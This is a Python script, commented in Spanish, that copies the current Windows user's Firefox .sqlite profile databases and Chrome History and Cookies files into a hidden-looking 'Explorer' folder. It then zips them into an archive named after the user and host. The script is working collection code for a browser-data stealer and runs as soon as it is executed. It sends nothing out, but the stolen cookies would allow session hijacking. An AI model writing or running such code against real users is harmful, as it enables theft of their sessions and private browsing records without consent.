#!/usr/bin/python
#-*- coding: latin-1 -*-

#print("###############################################")
#print("########## HISTORIAL DE NAVEGACION ############")
#print("###############################################")

import os
import shutil
import zipfile
import socket

##################################################################
directorio_actual = os.getcwd()
directorio_raiz =  os.path.join(os.getcwd(), "/")
##################################################################

def buscar_archivos():
    r = []
    a = []
    firefox_places = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
    chrome = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
    ##############################################################################
    ################ CREA UN DIRECTORIO PARA COPIAR LOS ARCHIVOS #################
    ##############################################################################

    directorio_prueba = os.path.expanduser('~')# Carpeta del usuario actual
    c = os.path.join(directorio_prueba, "Explorer")
    #print(c)
    if os.path.exists(c) == True:  # Si existe la carpeta pasa de largo
        pass
    else:
        os.chdir(directorio_prueba)
        os.mkdir("Explorer")  # Caso contrario la crea

    ##############################################################################
    ##################### BUSCA LOS ARCHIVOS Y LOS COPIA #########################
    ##############################################################################
    usuario = "C:\\Users\\" + os.getlogin() + firefox_places
    usuario2 = "C:\\Users\\" + os.getlogin() + chrome
    #usuario = "C:\\Users\\admin" + firefox_places
    #usuario2 = "C:\\Users\\admin" + chrome
    for ruta, carpeta, archivo in os.walk(usuario):
        r = ruta
        a = archivo
        k = len(a)
        if k > 20:
            for j in a:
                total = os.path.join(r, j)
                if ".sqlite" in total:
                    shutil.copy(total, c)

    for archivo2 in os.listdir(usuario2):

        r2 = usuario2
        a2 = archivo2
        k2 = len(a2)

        total2 = os.path.join(r2, a2)
        #if os.path.isfile(total2):
        if "History" in total2:
            shutil.copy(total2, c)
        if "Cookies" in total2:
            shutil.copy(total2, c)
        else:
            pass
    ##############################################################################
    ################# COMPRIME TODOS LOS ARCHIVOS COPIADOS #######################
    ##############################################################################
    host = socket.gethostname()
    nusuario = os.getlogin() +"-" + host + ".zip"
    archivo_zip = zipfile.ZipFile(os.path.join(c, nusuario), "w")
    for carpeta, subcarpetas, arcivos in os.walk(c):
        for arcivo in arcivos:
            archivo_zip.write(os.path.join(carpeta, arcivo), os.path.relpath(os.path.join(carpeta, arcivo), c), compress_type=zipfile.ZIP_DEFLATED)

            #-> Comprimir por Extencion
            #if arcivo.endswith(".sqlite"):
                #archivo_zip.write(os.path.join(carpeta, arcivo), os.path.relpath(os.path.join(carpeta, arcivo), c), compress_type=zipfile.ZIP_DEFLATED)

    archivo_zip.close()

buscar_archivos()
